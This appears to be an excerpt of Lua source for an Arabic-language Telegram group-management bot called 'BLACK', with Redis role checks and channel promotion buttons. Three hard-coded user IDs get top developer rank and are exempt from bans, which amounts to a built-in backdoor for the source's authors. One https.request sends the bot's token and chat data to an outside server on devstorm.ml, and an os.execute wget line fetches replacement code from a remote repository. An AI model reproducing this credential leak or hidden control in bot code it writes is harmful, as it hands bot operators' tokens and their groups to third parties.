...
Dev_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_BLACK = io.open("BLACK", 'w')
Run_File_BLACK:write([[
#!/usr/bin/env bash
cd $HOME/BLACK
...
Ids_Dev = {Id_Dev,1646796547,1792413842,1895790070,}
User_Bot = sudos.User_bot
Name_Bot = (redis:get(bot_id.."BLACK:Redis:Name:Bot") or "بلاك")
------------------------------------------------------------------------------------------------------------
function var(value)  
...
Status = true  
elseif tonumber(user_id) == tonumber(1646796547) then  
Status = true  
elseif tonumber(user_id) == tonumber(1895790070) then  
Status = true  
elseif tonumber(user_id) == tonumber(1792413842) then  
Status = true    
...
elseif redis:sismember(bot_id.."BLACK:Developer:Bot1", user_id) then
Status = redis:get(bot_id.."BLACK:Developer:Bot:Reply"..chat_id) or "المطور الاساسي"  
elseif redis:sismember(bot_id.."BLACK:Developer:Bot", user_id) then
Status = redis:get(bot_id.."BLACK:Developer:Bot:Reply"..chat_id) or "المطور"  
elseif redis:sismember(bot_id.."BLACK:President:Group"..chat_id, user_id) then
Status = redis:get(bot_id.."BLACK:President:Group:Reply"..chat_id) or "المنشئ الاساسي"
elseif redis:sismember(bot_id..'BLACK:Constructor:Group'..chat_id, user_id) then
...
Status = redis:get(bot_id.."BLACK:Mempar:Group:Reply"..chat_id) or "عضو"
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
...
local text1 = redis:get(bot_id..'BLACK:new:sourse1') or '《《《《 ᴛᴀᴇᴍ ʙʟᴀᴄᴋ 》》》》'
local text2 = redis:get(bot_id..'BLACK:new:sourse2') or '🎗࿈'
text = string.gsub(text,"《《《《 ᴛᴀᴇᴍ ʙʟᴀᴄᴋ 》》》》",text1)
...
ᴄʜᴀɴᴇʟ ➳ [ ᴛᴀᴇᴍ ʙʟᴀᴄᴋ](https://t.me/BLACK_TEAM_4)
]])
return false  
end
...
os.execute('wget https://raw.githubusercontent.com/amrjava/BLACK/main/BLACK.lua')
...
local list = redis:smembers(bot_id.."BLACK:Removal:User:Groups"..msg.chat_id_)
if #list == 0 then
...
if DeveloperBot12(result.sender_user_id_) == DeveloperBot12 (1792413842) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مطور السورس عام\n✓")
return false 
end
if DeveloperBot12(result.sender_user_id_) == DeveloperBot12 (1895790070) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مطور السورس\n✓")
return false 
end
if DeveloperBot12(result.sender_user_id_) == DeveloperBot12 (1646796547) then  
...
if tonumber(result.id_) == tonumber(1792413842) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس عام\n✓")
return false 
end
if tonumber(result.id_) == tonumber(1895790070) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس\n✓")
return false 
end
if tonumber(result.id_) == tonumber(1646796547) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس\n✓")
return false 
end
...
if tonumber(userid) == tonumber(1792413842) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس عام\n✓")
return false 
end
if tonumber(userid) == tonumber(1895790070) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس\n✓")
return false 
end
if tonumber(userid) == tonumber(1646796547) then  
send(msg.chat_id_, msg.id_, "🎗࿈لا تسطيع حظر مبرمج السورس\n✓")
return false 
end
Send_Options(msg,userid,"reply","تم حظره عام من المجموعات\n✓")  
redis:sadd(bot_id.."BLACK:Removal:User:Groups", userid)
...
redis:srem(bot_id.."BLACK:Removal:User:Groups", userid)
...
redis:sadd(bot_id.."BLACK:Developer:Bot", userid)
...
redis:srem(bot_id.."BLACK:Developer:Bot", userid)
...
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  redis:set(bot_id.."BLACK:Get:Id:Msg:Pin"..msg.chat_id_,data.pinned_message_id_)  end,nil)
...
if text == 'جاك' or text == 'خالد' or text == 'المبرمج جاك' or text == 'JACK ' or text == 'jack ' then
local Text =[[
࿈ مبرمج السورس
]]
keyboard = {} 
...
{
{text = 'ᴊᴀᴄᴋ', url = "https://t.me/PHP57"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'جوكر' or text == 'محمد' or text == ' الجوكر' or text == 'JOKER ' or text == ' joker ' then
local Text =[[
࿈ مبرمج السورس
]]
keyboard = {} 
...
{
{text = 'ᴊᴏᴋᴇʀ', url = "https://t.me/UUOUOU_7"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/amr_java&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{
{text = '🄲🄷🄰🄽🄽🄴🄻', url = "https://t.me/BLACK_TEAM_4"},
},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = 'ADHAM', url = "https://t.me/DuuuDD"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if text == (redis:get(bot_id.."BLACK:Redis:Name:Bot") or "بلاك") then
Namebot = (redis:get(bot_id.."BLACK:Redis:Name:Bot") or "بلاك")
local namebot = {
"يا روح "..Namebot.. " قول",
...
send(msg.chat_id_, msg.id_, t..'《《《《 ᴛᴀᴇᴍ ʙʟᴀᴄᴋ 》》》》\nاضغط علي الاسم ليتم نسخه\n《《《《 ᴛᴀᴇᴍ ʙʟᴀᴄᴋ 》》》》\n')
end
--__
...
https.request('http://devstorm.ml/BLACK/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '- ᴛᴀᴇᴍ ʙʟᴀᴄᴋ .',url="t.me/BLACK_TEAM_4"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'يا بوت' or text == 'بوت' or text == 'بوت بلاك' then
local Text = [[
...
local Text =[[
[ ༺ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 BLACK ༻](t.me/BLACK_TEAM_4) 

[ ༺ TAEM BLACK ༻ ](t.me/UU_VIIB)
...
{
{text = 'ᴊᴏᴋᴇʀ', url = "https://t.me/UUOUOU_7"},{text = 'ᴊᴀᴄᴋ', url = "https://t.me/PHP57"},
},
{
{text = 'ADHAM ', url = "https://t.me/DuuuDD"}
},
{
{text = 'ᴛᴀᴇᴍ ʙʟᴀᴄᴋ', url = "https://t.me/BLACK_TEAM_4"}
},
{
{text = 'اضف البوت لمجموعتك࿊', url="https://t.me/"..User_Bot.."?startgroup=new"}
},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BLACK_TEAM_4/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "المطور" or text == "مطور" then
local TEXT_SUD = redis:get(bot_id..'BLACK:TEXT_SUDO')
if TEXT_SUDO then 
...
{
{text = 'قناه سورس بلاك ↗️', url = "https://t.me/BLACK_TEAM_4"}
},
{
{text = 'اضف البوت لمجموعتك࿊', url="https://t.me/"..User_Bot.."?startgroup=new"}
},
...
if text and text:match("^ايدي @(.*)$") and not redis:get(bot_id..'BLACK:Lock:Id:Photo'..msg.chat_id_) or text and text:match("^ايدي @(.*)$") and not redis:get(bot_id..'BLACK:Lock:Id:Photo'..msg.chat_id_) then
...
send(msg.chat_id_, msg.id_,'🎗࿈ لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'BLACK:Num:Add:Bot') or 0)..'* عضو')
return false
end
...
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del(bot_id..'BotBLACK:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'BotBLACK:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
